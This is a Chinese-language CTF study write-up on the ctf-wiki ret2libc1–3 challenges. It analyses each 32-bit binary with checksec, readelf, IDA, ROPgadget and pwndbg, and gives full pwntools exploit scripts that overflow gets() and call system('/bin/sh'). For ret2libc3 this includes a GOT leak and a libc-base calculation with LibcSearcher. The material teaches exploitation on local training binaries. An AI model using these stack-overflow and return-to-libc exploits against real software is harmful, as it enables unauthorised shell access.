> **Tips**: ret2libc的问题目测较常见，案例ret2libc3类似的出现较多，故在ret2libc3下不仅有对例题的解析，也有知识点总结、参考链接等

# ret2libc

> 出自 https://github.com/ctf-wiki/ctf-wiki 中的Pwn: Linux Pwn: 栈溢出: 基本ROP
>
> writer: github.com/hex-16   data: 2021.3   contact: hexhex16@outlook.com
>
> file: ret2libc1, ret2libc2, ret2libc3     (download from https://github.com/ctf-wiki/ctf-wiki)
>
> 原始出处未知，非比赛题目(也许)，故所在文件夹命名方式有所区别
>
> https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html    

- 由简单到难分别给出三个例子。
- ret2libc1：可以找到`system`和`"/bin/sh"`
- ret2libc2：找得到`system`找不到`"/bin/sh"`，调用多一次`gets`，用于输入`"/bin/sh"`
- ret2libc3：`system`和`"/bin/sh"`都找不到，

---

# ret2libc1

> file: ret2libc1

- 目标：控制程序执行`system("/bin/sh")`

- 思路：找到程序的`"/bin/sh"`和`system`的地址，控制程序执行`system`，并构造`system`函数的栈帧

- `system`函数有一个致命的缺陷就是：有时候我们并不能利用它成功获取root权限。

  因为system函数本质上就是通过fork一个子进程，然后该子进程通过系统自带的sh执行system的命令。而在某些系统中，在启动新进程执行sh命令的时候会将它的特权给剔除掉(如果/bin/sh指向zsh，则不会进行权限降低；如果/bin/sh指向bash则会进行权限降低)，这样我们system就无法获取root权限了。

  为了解决这个问题，高手们又研发了一种更高级的攻击技术——基于libc的函数调用链攻击(https://wooyun.js.org/drops/return2libc%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html)

```bash
checksec --file=ret2libc1
RELRO         STACK CANARY    NX          PIE      RPATH     RUNPATH     Symbols      FORTIFY Fortified    Fortifiable   FILE
Partial RELRO No canary found NX enabled  No PIE   No RPATH  No RUNPATH  84) Symbols    No    0            1             ret2libc1
```

- IDA main函数：

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("RET2LIBC >_<");
  gets(s); // 溢出点
  return 0;
}
```



## ROPgadget

- 利用 `ropgadget`，查看是否有 `/bin/sh` 存在

```bash
$ ROPgadget --binary ret2libc1 --string '/bin/sh'
Strings information
============================================================
0x08048720 : /bin/sh
```



## IDA: Find function "system"

- 再次查找一下是否有 `system` 函数存在

```assembly
# 找到system函数：
extern:0804A0F4 ; int system(const char *command)
extern:0804A0F4                 extrn system:near       ; CODE XREF: _system↑j # 双击这个可以直接跳到代码段里面引用到的地方
extern:0804A0F4                                         ; DATA XREF: .got.plt:off_804A018↑o # 双击这个引用
# 然后可以在 .got.plt 段看到引用
.got.plt:0804A018 off_804A018     dd offset system        ; DATA XREF: _system↑r # 双击这个引用
# 在 .plt 找到使用的地方
.plt:08048460 ; =============== S U B R O U T I N E =======================================
.plt:08048460 ; Attributes: thunk
.plt:08048460 ; int system(const char *command)
.plt:08048460 _system         proc near               ; CODE XREF: secure+44↓p
.plt:08048460
.plt:08048460 command         = dword ptr  4
.plt:08048460
.plt:08048460                 jmp     ds:off_804A018 # 这里就是调用了system函数的地方
.plt:08048460 _system         endp
.plt:08048460
```



## Exploit

```python
#!/usr/bin/env python
from pwn import *
sh = process('./ret2libc1')

binsh_addr = 0x08048720 # 0x08048720 : /bin/sh 字符串所在的地址
system_plt = 0x08048460 # .plt:08048460  jmp     ds:off_804A018 # plt表，存放调用system函数的额外代码串的表
payload = flat(['a' * (108+4), system_plt, 'b' * 4, binsh_addr]) # 112是可供溢出字符串与返回地址的偏移量，分析方法与其他ROP问题相同
# 程序的RA覆盖为 system_plt，执行system()函数，'bbbb' 为system函数的虚假返回地址
sh.sendline(payload)
sh.interactive()
```

- 需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb' 作为虚假的地址，其后参数对应的参数内容

### Payload Analysis

```assembly
; High Address 高地址 ; main函数的栈被payload覆盖之后如下 ;payload.hex()
20870408 ; 0x08048720 binsh_addr "/bin/sh" 字符串所在的地址
62626262 ; 'bbbb'
60840408 ; 执行 ret(pop EIP); EIP被更改为 system_plt 即system函数的地址; 执行完后EBP, ESP指向此处
61616161 ; 'aaaa' ; 在ret前，ESP会被恢复为指向EBP，即"删"掉当前函数使用的栈
...
; Low Address 低地址
```

- `system_plt`是`system`函数的调用地址（实际为PLT表中调用`system`函数的代码片段的地址），即为正常从头调用system函数，而不是从system函数中间的指令开始
- 在`ret(pop EIP)`到`system`之后，`system`开始执行时，EBP指向的是`60840408`，对于`system`函数来说，EBP+4: `62626262`就是`system`的返回地址，EBP+8: `20870408 (0x08048720)`就是`system`的第一个参数。因此完成目标：调用`system("/bin/sh")`

---

# ret2libc2

> file: ret2libc2

- 解题思路：
  1. 覆盖gets的RA跳转至gets，再调用一次gets，读入`/bin/sh`(payload以外的sendline)至bbs段的buf2中
  2. 利用`pop Ereg; ret;`抬栈，使得RA覆盖为`system`
  3. 以buf2为参数，执行`system("/bin/sh")`

## Overview

```bash
$ checksec --file=ret2libc2
RELRO         STACK CANARY    NX         PIE     RPATH    RUNPATH     Symbols     FORTIFY Fortified  Fortifiable  FILE
Partial RELRO No canary found NX enabled No PIE  No RPATH No RUNPATH  84) Symbols   No    0          2            ret2libc2
```

```bash
$ readelf -S ret2libc2
There are 35 section headers, starting at offset 0x1924:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.bu[...] NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000f0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482c8 0002c8 000096 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          0804835e 00035e 00001e 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         0804837c 00037c 000030 00   A  6   1  4
  [ 9] .rel.dyn          REL             080483ac 0003ac 000018 08   A  5   0  4
  [10] .rel.plt          REL             080483c4 0003c4 000058 08   A  5  12  4
  [11] .init             PROGBITS        0804841c 00041c 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048440 000440 0000c0 04  AX  0   0 16
  [13] .text             PROGBITS        08048500 000500 000242 00  AX  0   0 16
  [14] .fini             PROGBITS        08048744 000744 000014 00  AX  0   0  4
  [15] .rodata           PROGBITS        08048758 000758 000065 00   A  0   0  4
  [16] .eh_frame_hdr     PROGBITS        080487c0 0007c0 000034 00   A  0   0  4
  [17] .eh_frame         PROGBITS        080487f4 0007f4 0000d0 00   A  0   0  4
  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000038 04  WA  0   0  4
  [24] .data             PROGBITS        0804a038 001038 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a040 001040 0000a4 00  WA  0   0 32  # 重点关注这个bbs段
  [26] .comment          PROGBITS        00000000 001040 00002b 01  MS  0   0  1
  [27] .debug_aranges    PROGBITS        00000000 00106b 000020 00      0   0  1
  [28] .debug_info       PROGBITS        00000000 00108b 000329 00      0   0  1
  [29] .debug_abbrev     PROGBITS        00000000 0013b4 0000f8 00      0   0  1
  [30] .debug_line       PROGBITS        00000000 0014ac 0000c2 00      0   0  1
  [31] .debug_str        PROGBITS        00000000 00156e 00026d 01  MS  0   0  1
  [32] .shstrtab         STRTAB          00000000 0017db 000146 00      0   0  1
  [33] .symtab           SYMTAB          00000000 001e9c 000540 10     34  50  4
  [34] .strtab           STRTAB          00000000 0023dc 000314 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```



## IDA Analysis

IDA逆向后的main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("Something surprise here, but I don't think it will work.");
  printf("What do you think ?");
  gets(s);
  return 0;
}
```

- gets函数的plt代码片段（即一条jmp指令）

```assembly
.plt:08048460 ; =============== S U B R O U T I N E =======================================
.plt:08048460 ; Attributes: thunk
.plt:08048460 ; char *gets(char *s)
.plt:08048460 _gets           proc near               ; CODE XREF: main+72↓p
.plt:08048460
.plt:08048460 gets_val        = dword ptr  4
.plt:08048460
.plt:08048460                 jmp     ds:off_804A010    ; 调用libc的函数gets的代码片段
.plt:08048460 _gets           endp
.plt:08048460
```



## ROPgadget

- 找得到`system`，但找不到`/bin/sh`

```bash
ROPgadget --binary ret2libc2 --string 'system'
Strings information
============================================================
0x0804831a : system
$ ROPgadget --binary ret2libc2 --string '/bin/sh'
Strings information
============================================================
```

- `pop ebx ; ret` gadget:

```bash
$ ROPgadget --binary ret2libc2 --only 'pop|ret' | grep 'ebx' 
0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804843d : pop ebx ; ret
```
- `ROPgadget --binary ret2libc2 --only 'pop|ret'`: `'pop|ret'` gadget

```bash
$ ROPgadget --binary ret2libc2 --only 'pop|ret'
Gadgets information
============================================================
0x0804872f : pop ebp ; ret
0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0804843d : pop ebx ; ret
0x0804872e : pop edi ; pop ebp ; ret
0x0804872d : pop esi ; pop edi ; pop ebp ; ret
0x08048426 : ret
0x0804857e : ret 0xeac1

Unique gadgets found: 7
```



## Exploit

```python
#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')
context.log_level = "DEBUG"
gets_plt = 0x08048460  # .plt:08048460  jmp ds:off_804A010 # char *gets(char *s)
system_plt = 0x08048490  # .plt:08048490  jmp ds:off_804A01C # int system(const char *command)
pop_ebx = 0x0804843d # 用于抬栈，使得调用完gets后调用system
buf2 = 0x0804a080 # 在bbs段的没有引用的 char buf2[100]
payload = flat(['a' * (0x6c + 4), gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
sh.sendline(payload)
sh.sendline('/bin/sh') # 读取到buf2的字符串
sh.interactive()
```

### Payload Analysis

注意对`pop_ebx`作用的解析，捋逻辑时从下往上看

```assembly
; High Address 高地址 ; main函数的栈被payload覆盖之后如下  ;payload.hex()
0804a080 ; buf2的地址，是system函数的第一个参数
deadbeef ; 0xdeadbeef system函数的虚假返回地址
08048490 ; system_plt; plt表中system函数的代码片段; 执行pop_ebx的ret时pop EIP用的是08048490, 即跳转到了system_plt
0804a080 ; buf2的地址; gets的第一个参数，即gets读取到的字符串被存储在buf2中
0804843d ; pop_ebx; gets的返回地址RA; 执行完gets之后，执行pop_ebx指向的pop ebx(buf2); ret(pop EIP); ESP抬了2次，指向system_plt
08048460 ; gets_plt; 原本的RA，执行ret(pop EIP)时 ESP 指向此处，故EIP被更改为gets_plt; 然后调用gets，pop_ebx为RA，buf2为第一个参数
61616161 ; 'aaaa'
...
; Low Address 低地址
```

`pop_ebx`处的作用为将ESP抬至`system_plt`使得能够pop `08048490` 给EIP，即让EIP指向`system_plt`，控制程序执行`system`函数。也就是说，`pop ebx; ret`里的ebx没有实际意义，gets和system函数均未使用ebp寄存器来传递参数（而是用栈），换成其他不会影响后续程序的寄存器均可。但是由前面`ROPgadget --binary ret2libc2 --only 'pop|ret'`的输出可知，`pop Ereg; ret`模式的只有`0x0804843d`一处，而当前问题恰需抬栈2次(2x4bytes)。

---

# ret2libc3

> file: ret2libc3
>
> 相关参考链接：
>
> https://xz.aliyun.com/t/3402

- ret2libc3在ret2libc2的基础上，去掉了可直接查找的`system`函数的地址，亦即ret2libc3不会出现`system`函数。故此时需同时查找`system`和`"/bin/sh"`的地址
- 思路：



查找`system`函数地址所涉两个重要知识点：

1. system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。
2. 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。查 libc 版本: https://github.com/niklasb/libc-database

故如果知道libc中某个函数的地址，就可以知道该程序使用的libc的版本，进而确定libc基址、确定`system`函数地址。libc 中也有 `/bin/sh` 字符串，也可获得。

获得libc某个函数的方法：**got表项泄露**，即输出某个函数对应的 got 表项的内容。由于 **libc 的延迟绑定机制**，需要**泄漏已经执行过的函数的地址**

手动获取libc某函数的地址的过程：

1. 泄露一个 libc 函数的真实地址
2. 查询libc.so的版本，得到libc基址(https://github.com/niklasb/libc-database)
3. 依据libc.so的版本，得到其他任何 libc 函数真实地址

以上方法为手动获取libc某函数的过程，可以使用 libc 的利用工具LibcSearcher(python库) https://github.com/lieanu/LibcSearcher



## Overview

```bash
$ checksec --file=ret2libc3
RELRO         STACK CANARY     NX          PIE     RPATH     RUNPATH     Symbols      FORTIFY Fortified  Fortifiable  FILE
Partial RELRO No canary found  NX enabled  No PIE  No RPATH  No RUNPATH  83) Symbols    No    0          2            ret2libc3
```

```bash
$ readelf -S ret2libc3
There are 35 section headers, starting at offset 0x1924:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.bu[...] NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000e0 10   A  6   1  4
  [ 6] .dynstr           STRTAB          080482b8 0002b8 00008f 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048348 000348 00001c 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048364 000364 000030 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048394 000394 000018 08   A  5   0  4
  [10] .rel.plt          REL             080483ac 0003ac 000050 08   A  5  12  4
  [11] .init             PROGBITS        080483fc 0003fc 000023 00  AX  0   0  4
  [12] .plt              PROGBITS        08048420 000420 0000b0 04  AX  0   0 16
  [13] .text             PROGBITS        080484d0 0004d0 000242 00  AX  0   0 16
  [14] .fini             PROGBITS        08048714 000714 000014 00  AX  0   0  4
  [15] .rodata           PROGBITS        08048728 000728 000056 00   A  0   0  4
  [16] .eh_frame_hdr     PROGBITS        08048780 000780 000034 00   A  0   0  4
  [17] .eh_frame         PROGBITS        080487b4 0007b4 0000d0 00   A  0   0  4
  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4
  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4
  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        0804a000 001000 000034 04  WA  0   0  4
  [24] .data             PROGBITS        0804a034 001034 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a040 00103c 0000a4 00  WA  0   0 32   # 重点关注这个bbs段
  [26] .comment          PROGBITS        00000000 00103c 00002b 01  MS  0   0  1
  [27] .debug_aranges    PROGBITS        00000000 001067 000020 00      0   0  1
  [28] .debug_info       PROGBITS        00000000 001087 000329 00      0   0  1
  [29] .debug_abbrev     PROGBITS        00000000 0013b0 0000f8 00      0   0  1
  [30] .debug_line       PROGBITS        00000000 0014a8 0000c5 00      0   0  1
  [31] .debug_str        PROGBITS        00000000 00156d 000270 01  MS  0   0  1
  [32] .shstrtab         STRTAB          00000000 0017dd 000146 00      0   0  1
  [33] .symtab           SYMTAB          00000000 001e9c 000530 10     34  50  4
  [34] .strtab           STRTAB          00000000 0023cc 000305 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```



## IDA Analysis

- main函数如下，存在高危函数gets，可供栈溢出

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets(s); // 溢出点
  return 0;
}
```



## Exploit

- 脚本逻辑详细版见注释，以下为exploit思路：
  1. 控制程序执行puts，输出`__libc_start_main`的got表地址，并返回到main
  2. 根据`__libc_start_main`的got表地址判断`libc`版本，以此计算`system, str_bin_sh`的实际地址
  3. 第二次执行main，控制程序`ret`到`system`，参数`str_bin_sh`的实际地址。即执行`system("/bin/sh")` getshell
- 函数执行过程：`__libc_start_main`=>`main`=>`gets(payload1)`=>`puts(libc_start_main_got)`=>`main`=>`system("/bin/sh")`

```python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher # 用于判断libc版本
context.log_level = "DEBUG"
sh = process("./ret2libc3")

ret2libc3 = ELF("./ret2libc3")
# pwnlib.elf.elf.ELF.plt: dotdict of name to address for all Procedure Linkate Table (PLT) entries
puts_plt = ret2libc3.plt["puts"] # puts 函数的 plt 表地址
# pwnlib.elf.elf.ELF.got: dotdict of name to address for all Global Offset Table (GOT) entries
libc_start_main_got = ret2libc3.got["__libc_start_main"] # __libc_start_main 函数的 got 表地址 # 0x804a024
main = ret2libc3.symbols["main"] # main函数的地址

print("leak libc_start_main_got addr and ret to main", str(hex(puts_plt)), str(hex(main)), str(hex(libc_start_main_got)))
# puts_plt, main, libc_start_main_got: 0x8048460 0x8048618 0x804a024
payload = flat(['A' * (108+4), puts_plt, main, libc_start_main_got]) # main函数RA与字符串s之间的偏移量为108+4，分析方法其他ROP相同
# 覆盖main函数返回地址为puts_plt，令puts_plt的RA为main，参数为libc_start_main_got # puts会输出 __libc_start_main 的got表地址
print("payload: ", payload.hex())
sh.sendlineafter("Can you find it !?", payload) # 收到 "Can you find it !?" 后发送payload

libc_start_main_addr = u32(sh.recv()[0:4]) # 接收前面payload输出的 libc_start_main_got
print("got libc_start_main_addr:", str(hex(libc_start_main_addr))) # got libc_start_main_addr: 0xf7de8d40
libc = LibcSearcher("__libc_start_main", libc_start_main_addr) # 用LibcSearcher库查找libc版本(可能不止一个)
libcbase = libc_start_main_addr - libc.dump("__libc_start_main") # 计算加载的libc的基址
print("loaded libc base addr:", str(hex(libcbase))) # loaded libc base addr: 0xf7dca000
system_addr = libcbase + libc.dump("system") # 计算 system 函数实际所在的地址
binsh_addr = libcbase + libc.dump("str_bin_sh") # 计算 str_bin_sh 字符串实际所在的地址
# 第二个payload，用于getshell
payload = flat(['A' * (100+4), system_addr, 0xdeadbeef, binsh_addr]) # 注意这里RA与字符串s之间的偏移量从前面的112变为104
sh.sendline(payload) # 覆盖RA为system_addr，执行system("/bin/sh")，system的RA为0xdeadbeef

sh.interactive()
```

- 运行过程中会提示有多个libc满足当前约束。选择 7 - libc6_2.31-8_i386

```python
[+] There are multiple libc that meet current constraints :
0 - libc-2.32-1.1.i586
1 - libc6-x32_2.17-93ubuntu4_amd64
2 - libc6-x32_2.17-93ubuntu4_i386
3 - libc6_2.31-6_i386
4 - libc-2.32-4.1.i586
5 - libc6-i386_2.31-6_amd64
6 - libc6-i386_2.31-8_amd64
7 - libc6_2.31-8_i386  # 正确的libc # 选择方法：一个个试.......
8 - libc6_2.31-7_i386
9 - libc6-i386_2.31-9_amd64
[+] Choose one : 7
```



### Payload Analysis

为什么第一个payload中RA与字符串之前的偏移为112而第二个payload的为104（减少8bytes）？

```python
payload = flat(['A' * (108+4), puts_plt, main, libc_start_main_got])
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
```

- 暂无理论分析，但gdb调试可以得到前后两个payload的偏移量的计算方法



#### How 2 calculate

- 使用如下脚本，将第一个 payload 的内容保存在 input 文件中。
- 疑问：使用`hexdump`显示的 input 文件与代码中输出的字节序有不同，具体原因未知

```python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher 
context.log_level = "DEBUG"
sh = process("./ret2libc3")

ret2libc3 = ELF("./ret2libc3")
puts_plt = ret2libc3.plt["puts"] 
libc_start_main_got = ret2libc3.got["__libc_start_main"] 
main = ret2libc3.symbols["main"] 

print("leak libc_start_main_got addr and ret to main", str(hex(puts_plt)), str(hex(main)), str(hex(libc_start_main_got)))
# puts_plt, main, libc_start_main_got: 0x08048460 0x08048618 0x0804a024
payload = flat(['A' * (108+4), puts_plt, main, libc_start_main_got])
print("payload: ", payload.hex(), type(payload)) # <class 'bytes'>
# ...... 41414141 60840408 18860408 24a00408 
with open("input", "wb") as f:
    f.write(payload) 
```

- gdb调试，使用保存在`input`文件中的第一个payload作为输入

```assembly
$ gdb ret2libc3 -q
pwndbg> b *0x0804868A   ; 断点下在了gets调用的地方
Breakpoint 1 at 0x804868a: file ret2libcGOT.c, line 27.
pwndbg> r < input
Starting program: /home/kali/CTF/pwn/ret2libc3 < input
No surprise anymore, system disappeard QQ.
Can you find it !?
Breakpoint 1, 0x0804868a in main () at ret2libcGOT.c:27
27      ret2libcGOT.c: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────
 EAX  0xffffd3bc —▸ 0xf7fecd66 (_dl_sysdep_start+1462) ◂— mov    eax, dword ptr [esp + 0x6c] ; 字符串s的地址
 EBX  0x0
 ECX  0x12
 EDX  0xffffffff
 EDI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 EBP  0xffffd428 ◂— 0x0 ; 0xffffd3bc - 0xffffd428 = -108 # 计算第一次payload的偏移量 !!!!!!!!!!!!!!!!!!
 ESP  0xffffd3a0 —▸ 0xffffd3bc —▸ 0xf7fecd66 (_dl_sysdep_start+1462) ◂— mov    eax, dword ptr [esp + 0x6c]
 EIP  0x804868a (main+114) —▸ 0xfffdb1e8 ◂— 0xfffdb1e8
──────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────
 ► 0x804868a <main+114>             call   gets@plt <gets@plt> ; 断点下在了gets调用的地方
        arg[0]: 0xffffd3bc —▸ 0xf7fecd66 (_dl_sysdep_start+1462) ◂— mov    eax, dword ptr [esp + 0x6c]
        arg[1]: 0x0
        arg[2]: 0x1
        arg[3]: 0x0
..................................................; 省略一大段无关紧要的输出
pwndbg> c ; 程序继续，将在第二次执行gets时断下
Continuing.  ;下面这一行就是前面payload的功能，输出 libc_start_main_got
@▒▒▒▒▒Ƅ       ; libc_start_main_got: 0xf7de8d40 @=0x40 b=0x62 #这个b是怎么回事就不知道了....也不确定是不是b
No surprise anymore, system disappeard QQ. ; 第二次执行 main
Can you find it !?
Breakpoint 1, 0x0804868a in main () at ret2libcGOT.c:27
27      in ret2libcGOT.c
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────
*EAX  0xffffd3cc ◂— 0x1 ; 上次断点时为 0xffffd3bc
 EBX  0x0
 ECX  0x12
 EDX  0xffffffff
 EDI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
 ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e4d6c
*EBP  0xffffd430 ◂— 0x41414141 ('AAAA') ; 上次断点时为 0xffffd428 ; 0xffffd3cc - 0xffffd430 = -100 ; 第二次payload偏移量计算 !!!!!
*ESP  0xffffd3b0 —▸ 0xffffd3cc ◂— 0x1
 EIP  0x804868a (main+114) —▸ 0xfffdb1e8 ◂— 0x0
```





#### Detailed Analysis Using pwndbg

- 与上一节一样，将payload1存储到input中，然后用input作为第一次输入，使用pwndbg调试，重点分析main函数序言前后，gets前后，ret前后的EBP，ESP，EIP变化，将断点下在main函数需要的第一条指令、gets处、ret处，然后在重要的地方使用`ni `(step over 汇编层面的一步)进行调试。
- 调试中将EBP、ESP、EIP等相关性较高的记录在IDA的注释中，记录结果如下：

```assembly
.text:08048618 ; Attributes: bp-based frame fuzzy-sp
.text:08048618 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:08048618         public main
.text:08048618 main    proc near               ; DATA XREF: _start+17↑o   ;下面四行的注释是两次main调用时，gdb显示的函数调用栈
.text:08048618 s       = byte ptr -64h   ;► f 0  8048618 main  ; 1st main的调用栈
.text:08048618 argc    = dword ptr  8    ;  f 1 f7de8e46 __libc_start_main+262
.text:08048618 argv    = dword ptr  0Ch  ;► f 0  8048618 main  ; 2nd main的调用栈
.text:08048618 envp    = dword ptr  10h  ;  f 1  804a024 __libc_start_main@got.plt ;注意调用栈这里与第一次main不同(可能影响ESP)
.text:08048618                    
.text:08048618 ; __unwind {       
.text:08048618         push   ebp;before push ebp:EBP 0x0                ESP 0xffffd42c 
                             ; 2nd main：      *EBP 0x41414141('AAAA')  *ESP 0xffffd434—▸0x804a024(__libc_start_main@got.plt)—▸0xf7de8d40(__libc_start_main)◂—call 0xf7f0c3a9  ;ESP的值在两次进入main时是不同的: 0xffffd434-0xffffd42c=8
.text:08048619         mov    ebp, esp      ;   EBP  0x0                *ESP 0xffffd428 ◂— 0x0
                                ; 2nd main:     EBP 0x41414141('AAAA')  *ESP 0xffffd430 ◂— 0x41414141('AAAA')
.text:0804861B         and    esp, 0FFFFFFF0h; *EBP 0xffffd428 ◂— 0x0    ESP 0xffffd428 ◂— 0x0
                     ; 2nd main: *EBP 0xffffd430 ◂— 0x41414141('AAAA')   ESP 0xffffd430 ◂— 0x41414141('AAAA') ; EBP,ESP较第一次+2
.text:0804861E         add    esp, -80h  ;      EBP 0xffffd428 ◂— 0x0   *ESP 0xffffd420—▸0xf7faf000(_GLOBAL_OFFSET_TABLE_)◂—0x1e4d6c
                     ; 2nd main: *EBP 0xffffd430 ◂— 0x41414141('AAAA')   ESP 0xffffd430 ◂— 0x41414141('AAAA')
.text:08048621         mov    eax, ds:stdout@@GLIBC_2_0; EBP 0xffffd428◂—0x0     *ESP 0xffffd3a0 ◂— 0x0
                     ; 2nd main:  EBP 0xffffd430 ◂— 0x41414141('AAAA')  *ESP 0xffffd3b0—▸0xf7e45f97(_IO_do_write+39)◂—cmp ebx, eax
.text:08048626         mov    dword ptr [esp+0Ch], 0 ; n
.text:0804862E         mov    dword ptr [esp+8], 2 ; modes
.text:08048636         mov    dword ptr [esp+4], 0 ; buf
.text:0804863E         mov    [esp], eax      ; stream
.text:08048641         call   _setvbuf
.text:08048646         mov    eax, ds:stdin@@GLIBC_2_0
.text:0804864B         mov    dword ptr [esp+0Ch], 0 ; n
.text:08048653         mov    dword ptr [esp+8], 1 ; modes
.text:0804865B         mov    dword ptr [esp+4], 0 ; buf
.text:08048663         mov    [esp], eax      ; stream
.text:08048666         call   _setvbuf
.text:0804866B         mov    dword ptr [esp], offset aNoSurpriseAnym ; "No surprise anymore, system disappeard "...
.text:08048672         call   _puts
.text:08048677         mov    dword ptr [esp], offset format ; "Can you find it !?"
.text:0804867E         call   _printf
.text:08048683         lea    eax, [esp+80h+s]
.text:08048687         mov    [esp], eax    ; s
.text:0804868A         call   _gets ; EBP 0xffffd428 ◂— 0x0      ESP 0xffffd3a0 —▸ 0xffffd3bc —▸ 0xf7fecd66(_dl_sysdep_start+1462) ◂— mov  eax, dword ptr [esp + 0x6c] ; 0xffffd3bc-0xffffd428= -108(payload1 offset)
           ; 2nd main: EBP 0xffffd430 ◂— 0x41414141('AAAA')      ESP 0xffffd3b0 —▸ 0xffffd3cc ◂— 0x1 ;0xffffd3cc-0xffffd430= -100
.text:0804868F         mov    eax, 0
.text:08048694         leave; EBP 0xffffd428◂—0x41414141('AAAA') ESP 0xffffd3a0 —▸ 0xffffd3bc ◂— 0x41414141('AAAA').text:08048694
              ; 2nd main: EBP 0xffffd430◂—0x41414141('AAAA')     ESP 0xffffd3b0 —▸ 0xffffd3cc ◂— 0x1
.text:08048695         retn; *EBP 0x41414141 ('AAAA')           *ESP 0xffffd42c —▸ 0x8048460(puts@plt) ◂— jmp dword ptr [0x804a018]
  ; *EIP 0x8048695(main+125)◂—ret ; EBP被payload覆盖了; ESP 0xffffd42c是一开始的 EBP 0xffffd428+4  ESP 0xffffd428+4 即RA地址
     ; 2nd main:             *EBP 0x41414141('AAAA')            *ESP 0xffffd434 —▸ 0x804a024(__libc_start_main@got.plt) 
     ; .got.plt:0804A024 off_804A024     dd offset __libc_start_main ; 0x804a024 处对应的内容，puts的参数
.text:08048695 ; } // starts at 8048618                                 —▸ 0xf7de8d40(__libc_start_main) ◂— call 0xf7f0c3a9
.text:08048695 main    endp
           ; after ret：      EBP 0x41414141('AAAA')            *ESP 0xffffd430 —▸ 0x8048618(main)◂—push ebp; 0xffffd430=0xffffd42c+4
